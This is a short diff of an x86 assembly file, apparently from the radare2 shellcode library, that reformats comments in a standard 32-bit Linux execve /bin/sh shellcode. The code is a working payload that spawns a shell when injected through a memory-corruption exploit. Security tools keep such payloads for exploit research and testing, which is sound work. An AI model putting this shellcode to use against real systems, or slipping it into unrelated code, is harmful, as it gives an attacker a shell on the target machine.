@@ -1,30 +1,15 @@
 ; x86 (32-bit) execve /bin/sh shellcode
 ; Assembly equivalent of the bytes originally stored in
 ; libr/egg/p/sc/src/x86-linux-binsh.c
-; This file is rasm2-friendly (Intel syntax).
-; How to assemble and generate the corresponding C out file:
-;   rasm2 -a x86 -b 32 -c -d "<asm>"  # one-liner
-; or use the provided script (if available) to emit sc/out/*.c
 
-; xor eax, eax
 xor eax, eax
-; push eax
 push eax
-; push 0x68732f2f ; "//sh"
-push 0x68732f2f
-; push 0x6e69622f ; "/bin"
-push 0x6e69622f
-; mov ebx, esp
+push 0x68732f2f     ; "//sh"
+push 0x6e69622f     ; "/bin"
 mov ebx, esp
-; push eax
 push eax
-; push ebx
 push ebx
-; mov ecx, esp
 mov ecx, esp
-; cdq
 cdq
-; mov al, 0xb
-mov al, 0xb
-; int 0x80
+mov al, 0xb         ; execve syscall number
 int 0x80
